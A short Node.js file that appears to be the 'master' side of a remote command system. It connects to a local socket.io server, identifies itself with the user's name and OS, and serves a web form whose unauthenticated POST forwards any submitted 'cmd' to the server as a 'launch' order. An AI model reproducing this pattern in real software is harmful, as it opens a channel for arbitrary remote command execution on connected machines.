const io = require('socket.io-client');
const socket = io('http://localhost:3000');
const chalk = require("chalk");
const { exec } = require("child_process");
const os = require("os");

console.log(chalk.blue("\nConnecting...\n"))

socket.on('connect', () => {
    console.log(chalk.green("Successfully connected"));
    console.log(chalk.blue("Sending authentification..."))
    socket.emit("auth", {username:os.userInfo().username, os:os.type(), type:"master"});
    console.log(chalk.green("Successfully authentified"));
});

//On order
socket.on("response", function(data){
    console.log(data.response)
});


socket.on('disconnect', () => {
    console.log(chalk.red("Disconnected"))
});



let ejs = require('ejs');
var bodyParser = require('body-parser')
var express = require('express');
var webApp = express();
webApp.use(bodyParser.urlencoded({ extended: true }));
webApp.set('view engine', 'ejs');

webApp.get('/', function (req, res) {
    res.render("schematic.ejs")
});

webApp.post("/", function(req, res) {
    socket.emit("launch", req.body.cmd);
    res.redirect("/")
})

webApp.listen(8000);
